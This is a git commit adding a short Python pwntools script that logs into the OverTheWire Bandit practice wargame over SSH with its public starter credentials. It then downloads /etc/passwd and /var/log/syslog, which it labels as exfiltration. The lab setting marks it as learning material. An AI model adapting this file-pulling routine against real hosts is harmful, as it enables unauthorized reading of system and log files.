a137a48a083571f50b01107f9c5c55de2dba4e18
SapereAude86 <sdehaan86@protonmail.com>
2018-08-19 16:44:59 +0200

    Added py script

---
+++ ssh_pwn.py
@@ -0,0 +1,24 @@
+from pwn import *
+
+username = "bandit0"
+host = "bandit.labs.overthewire.org"
+password = "bandit0"
+port = 2220
+
+shell = ssh(username, host, password=password, port=port)
+exfil_files = ['/etc/passwd', '/var/log/syslog', ]
+
+
+def download_data(shell):
+    print "Exfiltrating : " + shell.distro[0] + shell.distro[1] + " with user: " + str(shell['whoami'])
+    for exfil_file in exfil_files:
+        print exfil_file
+        to_dl = shell.download_data(exfil_file)
+        if to_dl:
+            with open(exfil_file.split("/")[-1]+".txt", "w") as exfils:
+                    exfils.write(to_dl)
+
+if shell.connected():
+    print("whoami?: " + shell['whoami'])
+    download_data(shell)
+
